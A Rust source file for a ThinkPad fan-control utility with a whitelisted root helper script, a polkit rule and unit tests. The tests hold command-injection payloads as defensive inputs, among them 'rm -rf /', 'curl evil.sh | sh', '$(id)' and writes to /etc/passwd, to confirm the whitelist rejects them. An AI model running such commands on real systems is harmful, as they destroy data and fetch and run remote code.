use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fs;

const PROC_FAN: &str = "/proc/acpi/ibm/fan";
pub const HELPER_PATH: &str = "/usr/local/bin/thinkutils-fan-control";
pub const POLKIT_RULE_PATH: &str = "/etc/polkit-1/rules.d/50-thinkutils.rules";

/// Dedicated fan control helper script - validates input before writing to fan.
/// Installed at HELPER_PATH by setup_permissions().
pub const HELPER_SCRIPT: &str = r#"#!/bin/bash
set -e
FAN="/proc/acpi/ibm/fan"
# Exact-match whitelist. "watchdog 30" is permitted because the firmware
# watchdog can only ever return the fan to automatic control -- it is the
# recovery path if this app dies while holding a manual level. No other
# watchdog value is accepted, and enable/disable are deliberately absent.
case "$1" in
    "level auto"|"level full-speed"|"level 0"|"level 1"|"level 2"|"level 3"|"level 4"|"level 5"|"level 6"|"level 7"|"watchdog 30")
        echo "$1" > "$FAN"
        ;;
    *)
        echo "Invalid command" >&2
        exit 1
        ;;
esac
"#;

/// Watchdog timeout, in seconds, that the helper is willing to arm.
///
/// Must stay in sync with the literal in HELPER_SCRIPT above; a test asserts it.
pub const FAN_WATCHDOG_SECS: u32 = 30;

/// Polkit rule that only allows the dedicated helper script without password.
/// Much tighter than allowing arbitrary bash execution.
pub const POLKIT_RULE: &str = r#"/* ThinkUtils: Allow passwordless fan control via dedicated helper only */
polkit.addRule(function(action, subject) {
    if (action.id == "org.freedesktop.policykit.exec") {
        var program = action.lookup("program");
        if (program == "/usr/local/bin/thinkutils-fan-control") {
            if (subject.isInGroup("wheel") || subject.isInGroup("sudo")) {
                return polkit.Result.YES;
            }
        }
    }
});
"#;

/// Valid fan speed values (whitelist)
const VALID_SPEEDS: &[&str] = &["auto", "full-speed", "0", "1", "2", "3", "4", "5", "6", "7"];

/// Whether a fan speed is one this app is willing to send to the hardware.
///
/// This is the Rust-side gate; the installed helper script re-checks the full
/// `level <speed>` string independently, so a bypass here still hits a second
/// whitelist before anything is written.
fn is_valid_speed(speed: &str) -> bool {
    VALID_SPEEDS.contains(&speed)
}

/// Parse the contents of /proc/acpi/ibm/fan.
///
/// Format is `key:\tvalue` lines, e.g.
/// ```text
/// status:         enabled
/// speed:          3084
/// level:          auto
/// ```
/// Unknown keys are ignored — the file carries commands and capability hints
/// (`commands:`, `watchdog:`) that are not fan readings.
fn parse_fan_proc(content: &str) -> HashMap<String, String> {
    let mut fans = HashMap::new();

    for line in content.lines() {
        if let Some((key, value)) = line.split_once(':') {
            let key = key.trim();
            let value = value.trim();

            match key {
                "status" => {
                    fans.insert("status".to_string(), value.to_string());
                }
                "level" => {
                    fans.insert("level".to_string(), value.to_string());
                }
                "speed" => {
                    fans.insert("Fan1".to_string(), format!("{} RPM", value));
                }
                _ => {}
            }
        }
    }

    fans
}

/// Path to the modprobe config that enables fan control at boot.
pub const MODPROBE_CONF_PATH: &str = "/etc/modprobe.d/thinkpad_acpi.conf";

/// Whether the kernel module will accept fan writes at all.
///
/// thinkpad_acpi's `fan_set_level()` returns -EPERM unless the module was loaded
/// with `fan_control=1`, and that parameter is mode 0444 — it cannot be toggled
/// at runtime, so no amount of privilege escalation fixes it.
///
/// The driver zeroes `fan_control_commands` when the parameter is off, and
/// `fan_read()` only emits the `commands:` lines when it is set. So the presence
/// of those lines is a reliable, read-only probe for "writes will succeed".
///
/// Without this check the app reports EPERM as "Permission denied. Click Grant
/// Permissions" — advice that can never work, because the problem is the module,
/// not polkit.
fn fan_control_is_enabled(proc_fan_content: &str) -> bool {
    proc_fan_content
        .lines()
        .any(|l| l.trim_start().starts_with("commands:"))
}

/// What is standing between the user and working fan control.
#[derive(Debug, Serialize, Deserialize, PartialEq)]
pub enum FanReadiness {
    /// Writes should work.
    Ready,
    /// The module needs `fan_control=1`; polkit cannot help.
    NeedsModuleParam,
    /// No thinkpad_acpi fan interface — not a supported ThinkPad, or the module
    /// is not loaded.
    NoThinkpadFan,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct FanCapability {
    pub readiness: FanReadiness,
    /// True once the modprobe config exists, meaning the fix is applied but a
    /// reboot or module reload is still needed for it to take effect.
    pub modprobe_conf_present: bool,
    pub message: String,
}

#[tauri::command]
pub fn get_fan_capability() -> ApiResponse<FanCapability> {
    let modprobe_conf_present = crate::hardware_root::read_to_string(MODPROBE_CONF_PATH)
        .map(|c| c.contains("fan_control=1"))
        .unwrap_or(false);

    let (readiness, message) = match crate::hardware_root::read_to_string(PROC_FAN) {
        Err(_) => (
            FanReadiness::NoThinkpadFan,
            "No ThinkPad fan interface found. Load the thinkpad_acpi module, or this model may not be supported.".to_string(),
        ),
        Ok(content) if fan_control_is_enabled(&content) => {
            (FanReadiness::Ready, "Fan control is available.".to_string())
        }
        Ok(_) if modprobe_conf_present => (
            FanReadiness::NeedsModuleParam,
            "Fan control is configured but not active yet. Reboot, or reload the thinkpad_acpi module.".to_string(),
        ),
        Ok(_) => (
            FanReadiness::NeedsModuleParam,
            "The thinkpad_acpi module was loaded without fan_control=1, so it will refuse fan changes. This is a kernel module setting, not a permissions problem.".to_string(),
        ),
    };

    ApiResponse {
        success: true,
        data: Some(FanCapability {
            readiness,
            modprobe_conf_present,
            message,
        }),
        error: None,
    }
}

/// Write the modprobe config and try to reload the module.
#[tauri::command]
pub async fn enable_fan_control() -> ApiResponse<String> {
    // The reload can fail if the module is busy (an open /proc handle, a laptop
    // dock driver holding it). That is not an error worth failing on -- the
    // config file is written either way, so a reboot will apply it.
    let script = format!(
        "#!/bin/bash\nset -e\nprintf 'options thinkpad_acpi fan_control=1\\n' > {}\nmodprobe -r thinkpad_acpi 2>/dev/null && modprobe thinkpad_acpi 2>/dev/null || true\nexit 0\n",
        MODPROBE_CONF_PATH
    );

    let temp_script = match create_secure_temp_script(&script) {
        Ok(p) => p,
        Err(e) => {
            return ApiResponse {
                success: false,
                data: None,
                error: Some(e),
            }
        }
    };

    let result = tokio::process::Command::new("pkexec")
        .arg("bash")
        .arg(&temp_script)
        .output()
        .await;
    let _ = fs::remove_file(&temp_script);

    match result {
        Ok(output) if output.status.success() => {
            // Re-probe rather than assume the reload worked.
            let now_ready = crate::hardware_root::read_to_string(PROC_FAN)
                .map(|c| fan_control_is_enabled(&c))
                .unwrap_or(false);

            ApiResponse {
                success: true,
                data: Some(if now_ready {
                    "Fan control enabled.".to_string()
                } else {
                    "Fan control configured. Reboot to activate it — the module could not be reloaded while in use.".to_string()
                }),
                error: None,
            }
        }
        Ok(output) => ApiResponse {
            success: false,
            data: None,
            error: Some(format!(
                "Could not enable fan control: {}",
                String::from_utf8_lossy(&output.stderr)
            )),
        },
        Err(e) => ApiResponse {
            success: false,
            data: None,
            error: Some(format!("Could not enable fan control: {}", e)),
        },
    }
}

#[derive(Debug, Serialize, Deserialize)]
pub struct SensorData {
    pub temps: HashMap<String, String>,
    pub fans: HashMap<String, String>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct ApiResponse<T> {
    pub success: bool,
    pub data: Option<T>,
    pub error: Option<String>,
}

/// Create a temp script securely (O_EXCL prevents symlink attacks, random name, restricted perms)
#[cfg(unix)]
pub fn create_secure_temp_script(content: &str) -> Result<String, String> {
    use std::io::Write;
    use std::os::unix::fs::OpenOptionsExt;

    let random = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    let path = format!("/tmp/thinkutils_{}.sh", random);

    let mut file = fs::OpenOptions::new()
        .create_new(true) // O_EXCL: fail if exists, don't follow symlinks
        .write(true)
        .mode(0o700) // Only owner can read/write/execute
        .open(&path)
        .map_err(|e| format!("Failed to create temp script: {}", e))?;

    file.write_all(content.as_bytes()).map_err(|e| {
        let _ = fs::remove_file(&path);
        format!("Failed to write temp script: {}", e)
    })?;

    Ok(path)
}

#[cfg(not(unix))]
pub fn create_secure_temp_script(content: &str) -> Result<String, String> {
    let random = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    let path = format!("/tmp/thinkutils_{}.sh", random);
    fs::write(&path, content).map_err(|e| format!("Failed to create temp script: {}", e))?;
    Ok(path)
}

#[tauri::command]
pub fn get_sensor_data() -> ApiResponse<SensorData> {
    let mut temps = HashMap::new();
    let mut fans = HashMap::new();

    // Get fan info from /proc/acpi/ibm/fan
    match crate::hardware_root::read_to_string(PROC_FAN) {
        Ok(content) => {
            fans.extend(parse_fan_proc(&content));
        }
        Err(e) => {
            return ApiResponse {
                success: false,
                data: None,
                error: Some(format!("Failed to read {}: {}", PROC_FAN, e)),
            };
        }
    }

    // Read temperatures and fans from hwmon directly rather than shelling out
    // to `sensors`. That subprocess needed lm-sensors installed, hardcoded the
    // chip name thinkpad-isa-0000, and double-counted the first fan: procfs
    // contributed "Fan1" and `sensors` contributed "fan1", so the UI listed one
    // fan twice under two names.
    //
    // It also could not see the second fan at all on a dual-fan machine --
    // /proc/acpi/ibm/fan has a speed: field and no speed2:.
    let readings = crate::hwmon::read_all();

    // procfs already supplied the primary fan's speed. hwmon supplies every fan
    // including that one, so the procfs entry is dropped in favour of the
    // complete set rather than merged with it.
    fans.remove("Fan1");
    for tach in &readings.tachometers {
        fans.insert(tach.label.clone(), format!("{} RPM", tach.rpm));
    }

    for temp in &readings.temperatures {
        let label_lower = temp.label.to_lowercase();
        if label_lower.contains("cpu")
            || label_lower.contains("gpu")
            || label_lower.contains("package")
            || label_lower.contains("core")
        {
            temps.insert(temp.label.clone(), format!("{:.1}°C", temp.celsius));
        }
    }

    if temps.is_empty() {
        temps.insert(
            "Info".to_string(),
            "No CPU temperature sensors found on this machine.".to_string(),
        );
    }

    ApiResponse {
        success: true,
        data: Some(SensorData { temps, fans }),
        error: None,
    }
}

#[tauri::command]
pub async fn set_fan_speed(speed: String) -> ApiResponse<String> {
    // Validate speed against whitelist
    if !is_valid_speed(&speed) {
        return ApiResponse {
            success: false,
            data: None,
            error: Some(format!("Invalid fan speed: {}", speed)),
        };
    }

    // Reads may come from a captured hardware profile; writes never may. A test
    // must not be able to believe it changed a real fan.
    if crate::hardware_root::is_simulated() {
        return ApiResponse {
            success: false,
            data: None,
            error: Some(
                "Running against a simulated hardware profile. Fan changes are disabled."
                    .to_string(),
            ),
        };
    }

    println!("[Fan] Setting speed to: {}", speed);
    let command_str = format!("level {}", speed);

    // Check the module parameter before trying anything. If fan_control=1 is
    // missing the kernel returns -EPERM no matter who we are, and telling the
    // user to grant permissions sends them somewhere that cannot help.
    if let Ok(content) = crate::hardware_root::read_to_string(PROC_FAN) {
        if !fan_control_is_enabled(&content) {
            return ApiResponse {
                success: false,
                data: None,
                error: Some(
                    "The thinkpad_acpi module was loaded without fan_control=1, so the kernel will refuse fan changes. Enable it from the Fan Control page — this is a module setting, not a permissions problem.".to_string(),
                ),
            };
        }
    }

    // 1. Try direct write (no elevation needed)
    if fs::write(PROC_FAN, &command_str).is_ok() {
        println!("[Fan] ✓ Speed set successfully");
        return ApiResponse {
            success: true,
            data: Some(format!("Fan speed set to: {}", speed)),
            error: None,
        };
    }

    println!("[Fan] Need elevated permissions");

    // 2. Use dedicated helper if installed (passwordless via polkit rule)
    if std::path::Path::new(HELPER_PATH).exists() {
        match tokio::process::Command::new("pkexec")
            .arg(HELPER_PATH)
            .arg(&command_str)
            .output()
            .await
        {
            Ok(output) if output.status.success() => {
                println!("[Fan] ✓ Speed set via helper");
                return ApiResponse {
                    success: true,
                    data: Some(format!("Fan speed set to: {}", speed)),
                    error: None,
                };
            }
            Ok(_) => {
                return ApiResponse {
                    success: false,
                    data: None,
                    error: Some("Permission denied. Click 'Grant Permissions' to enable passwordless fan control.".to_string()),
                };
            }
            Err(e) => {
                return ApiResponse {
                    success: false,
                    data: None,
                    error: Some(format!("Failed to execute helper: {}", e)),
                };
            }
        }
    }

    // 3. Fallback: secure temp script + pkexec (will prompt for password)
    let script_content = format!(
        "#!/bin/bash\nset -e\necho '{}' > {}\nexit 0\n",
        command_str, PROC_FAN
    );

    let temp_script = match create_secure_temp_script(&script_content) {
        Ok(path) => path,
        Err(e) => {
            return ApiResponse {
                success: false,
                data: None,
                error: Some(e),
            };
        }
    };

    match tokio::process::Command::new("pkexec")
        .arg("bash")
        .arg(&temp_script)
        .output()
        .await
    {
        Ok(output) => {
            let _ = fs::remove_file(&temp_script);

            if output.status.success() {
                println!("[Fan] ✓ Speed set via pkexec");
                ApiResponse {
                    success: true,
                    data: Some(format!("Fan speed set to: {}", speed)),
                    error: None,
                }
            } else {
                ApiResponse {
                    success: false,
                    data: None,
                    error: Some("Permission denied. Click 'Grant Permissions' to avoid repeated password prompts.".to_string()),
                }
            }
        }
        Err(e) => {
            let _ = fs::remove_file(&temp_script);
            ApiResponse {
                success: false,
                data: None,
                error: Some(format!("Failed to execute pkexec: {}", e)),
            }
        }
    }
}

#[tauri::command]
pub fn check_permissions() -> ApiResponse<bool> {
    // Check if direct write is possible
    let direct_write = fs::OpenOptions::new().write(true).open(PROC_FAN).is_ok();

    // Check if the dedicated helper is installed (installed alongside the polkit rule).
    // We only check the helper because /etc/polkit-1/rules.d/ is root-only,
    // so Path::exists() on the polkit rule always fails for normal users.
    let helper_installed = std::path::Path::new(HELPER_PATH).exists();

    let has_permission = direct_write || helper_installed;

    ApiResponse {
        success: true,
        data: Some(has_permission),
        error: None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // -- Speed whitelist --

    #[test]
    fn accepts_every_documented_speed() {
        for s in ["auto", "full-speed", "0", "1", "2", "3", "4", "5", "6", "7"] {
            assert!(is_valid_speed(s), "'{}' should be accepted", s);
        }
    }

    #[test]
    fn rejects_out_of_range_and_malformed_speeds() {
        for s in [
            "8",
            "-1",
            "99",
            "AUTO",
            "Auto",
            "full speed",
            "fullspeed",
            "",
            " 3",
            "3 ",
            "0x3",
            "level 3",
        ] {
            assert!(!is_valid_speed(s), "'{}' should be rejected", s);
        }
    }

    /// The speed reaches a shell as `level <speed>`, so metacharacters must not survive.
    #[test]
    fn rejects_shell_metacharacters_in_speed() {
        for s in [
            "auto; rm -rf /",
            "3 && curl evil.sh | sh",
            "$(id)",
            "`id`",
            "3\nrm -rf /",
            "3 > /etc/passwd",
        ] {
            assert!(!is_valid_speed(s), "{:?} should be rejected", s);
        }
    }

    // -- /proc/acpi/ibm/fan parsing --

    /// Real output from a ThinkPad running thinkpad_acpi.
    const SAMPLE_PROC_FAN: &str = "\
status:\t\tenabled
speed:\t\t3084
level:\t\tauto
commands:\tlevel <level> (<level> is 0-7, auto, disengaged, full-speed)
commands:\tenable, disable
commands:\twatchdog <timeout> (0 disables, timeout is 0-120)
";

    #[test]
    fn parses_status_speed_and_level() {
        let fans = parse_fan_proc(SAMPLE_PROC_FAN);
        assert_eq!(fans.get("status").map(String::as_str), Some("enabled"));
        assert_eq!(fans.get("level").map(String::as_str), Some("auto"));
        assert_eq!(fans.get("Fan1").map(String::as_str), Some("3084 RPM"));
    }

    /// `commands:` lines describe capabilities, not readings. Treating them as fan
    /// data would surface "level <level> (<level> is 0-7...)" in the UI as a level.
    #[test]
    fn ignores_command_and_capability_lines() {
        let fans = parse_fan_proc(SAMPLE_PROC_FAN);
        assert_eq!(fans.len(), 3, "unexpected keys: {:?}", fans);
        assert!(!fans.contains_key("commands"));
        assert!(!fans.contains_key("watchdog"));
    }

    #[test]
    fn tolerates_empty_and_malformed_input() {
        assert!(parse_fan_proc("").is_empty());
        assert!(parse_fan_proc("no colon here\nanother line").is_empty());
        // A key with no value should not panic and should yield an empty string.
        assert_eq!(
            parse_fan_proc("level:").get("level").map(String::as_str),
            Some("")
        );
    }

    #[test]
    fn parses_numeric_level_not_just_auto() {
        let fans = parse_fan_proc("status:\tenabled\nlevel:\t7\nspeed:\t4500\n");
        assert_eq!(fans.get("level").map(String::as_str), Some("7"));
        assert_eq!(fans.get("Fan1").map(String::as_str), Some("4500 RPM"));
    }

    // -- fan_control=1 module parameter detection --

    /// The whole point of this probe: without fan_control=1 the driver zeroes
    /// fan_control_commands and fan_read() omits the commands: lines. Their
    /// absence means every write will return -EPERM, and no amount of polkit
    /// will change that.
    #[test]
    fn detects_fan_control_disabled_by_absent_commands_lines() {
        let without = "status:\t\tenabled\nspeed:\t\t2413\nlevel:\t\tauto\n";
        assert!(!fan_control_is_enabled(without));
    }

    #[test]
    fn detects_fan_control_enabled_by_commands_lines() {
        assert!(fan_control_is_enabled(SAMPLE_PROC_FAN));
    }

    #[test]
    fn fan_control_detection_tolerates_empty_and_partial_input() {
        assert!(!fan_control_is_enabled(""));
        assert!(!fan_control_is_enabled("status:\tenabled"));
        // A value that merely mentions the word must not count as a commands line.
        assert!(!fan_control_is_enabled("level:\tcommands: not really"));
    }

    // -- The installed privileged helper --

    /// Write HELPER_SCRIPT to a temp file and run it, so we test the bash that
    /// actually gets installed at HELPER_PATH and invoked under pkexec.
    fn run_helper(arg: &str) -> std::process::Output {
        use std::io::Write;
        use std::os::unix::fs::OpenOptionsExt;

        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_nanos();
        let path = std::env::temp_dir().join(format!(
            "thinkutils_helper_test_{}_{}.sh",
            std::process::id(),
            nanos
        ));

        let mut f = fs::OpenOptions::new()
            .create_new(true)
            .write(true)
            .mode(0o700)
            .open(&path)
            .expect("create helper");
        f.write_all(HELPER_SCRIPT.as_bytes()).expect("write helper");
        drop(f);

        let out = std::process::Command::new("bash")
            .arg(&path)
            .arg(arg)
            .output()
            .expect("run helper");
        let _ = fs::remove_file(&path);
        out
    }

    /// This is the security boundary: the helper runs as root under a polkit rule
    /// that grants it passwordless. If its case statement ever accepts something
    /// outside the whitelist, that is arbitrary root.
    #[test]
    fn helper_rejects_everything_outside_the_whitelist() {
        let payloads = [
            "level 8",
            "level -1",
            "enable",
            "disable",
            "level auto; rm -rf /",
            "level auto && curl evil.sh | sh",
            "level $(id)",
            "level `id`",
            "level auto\nrm -rf /",
            "; rm -rf /",
            "../../etc/passwd",
            "level AUTO",
            "",
        ];
        for p in payloads {
            let out = run_helper(p);
            let stderr = String::from_utf8_lossy(&out.stderr);
            assert!(
                stderr.contains("Invalid command"),
                "helper did not reject {:?} (stderr: {:?})",
                p,
                stderr
            );
            assert!(!out.status.success(), "helper exited 0 for {:?}", p);
        }
    }

    /// The watchdog is the recovery path when this app dies holding a manual
    /// level, so exactly one value is permitted -- and only that value.
    #[test]
    fn helper_accepts_only_the_one_watchdog_value() {
        let out = run_helper(&format!("watchdog {}", FAN_WATCHDOG_SECS));
        assert!(
            !String::from_utf8_lossy(&out.stderr).contains("Invalid command"),
            "helper must accept the watchdog arm command"
        );
        for bad in ["watchdog 0", "watchdog 1", "watchdog 120", "watchdog"] {
            let out = run_helper(bad);
            assert!(
                String::from_utf8_lossy(&out.stderr).contains("Invalid command"),
                "helper must reject {:?}",
                bad
            );
        }
    }

    /// HELPER_SCRIPT hardcodes the timeout in a bash case arm, so a change to
    /// the constant alone would silently stop the watchdog from ever arming.
    #[test]
    fn watchdog_constant_matches_helper_script() {
        assert!(
            HELPER_SCRIPT.contains(&format!("watchdog {}", FAN_WATCHDOG_SECS)),
            "FAN_WATCHDOG_SECS ({}) has no matching arm in HELPER_SCRIPT",
            FAN_WATCHDOG_SECS
        );
    }

    /// Complements the above: the whitelist must not be so tight that legitimate
    /// commands are refused. We assert only that they are not *rejected* — the
    /// write itself needs a ThinkPad and root, so it is expected to fail in CI.
    #[test]
    fn helper_accepts_the_documented_commands() {
        for level in ["auto", "full-speed", "0", "1", "2", "3", "4", "5", "6", "7"] {
            let arg = format!("level {}", level);
            let out = run_helper(&arg);
            let stderr = String::from_utf8_lossy(&out.stderr);
            assert!(
                !stderr.contains("Invalid command"),
                "helper wrongly rejected {:?} (stderr: {:?})",
                arg,
                stderr
            );
        }
    }

    /// The polkit rule grants passwordless root. It must name the helper binary and
    /// nothing else -- granting a shell would make the tight helper pointless.
    #[test]
    fn polkit_rule_grants_only_the_helper_binary() {
        assert!(
            POLKIT_RULE.contains(HELPER_PATH),
            "polkit rule must reference the helper path"
        );
        for forbidden in ["/bin/bash", "/bin/sh", "/usr/bin/bash", "/usr/bin/env"] {
            assert!(
                !POLKIT_RULE.contains(forbidden),
                "polkit rule must not grant {}",
                forbidden
            );
        }
    }

    /// The helper is written into a root-owned path by the setup script. If the
    /// constant ever drifted to a user-writable location, any local user could
    /// replace the binary that polkit grants passwordless root to.
    #[test]
    fn helper_path_is_not_user_writable_location() {
        assert!(HELPER_PATH.starts_with("/usr/local/bin/") || HELPER_PATH.starts_with("/usr/bin/"));
        for bad in ["/tmp/", "/var/tmp/", "/home/", "/dev/shm/"] {
            assert!(
                !HELPER_PATH.starts_with(bad),
                "helper must not live in {}",
                bad
            );
        }
    }
}
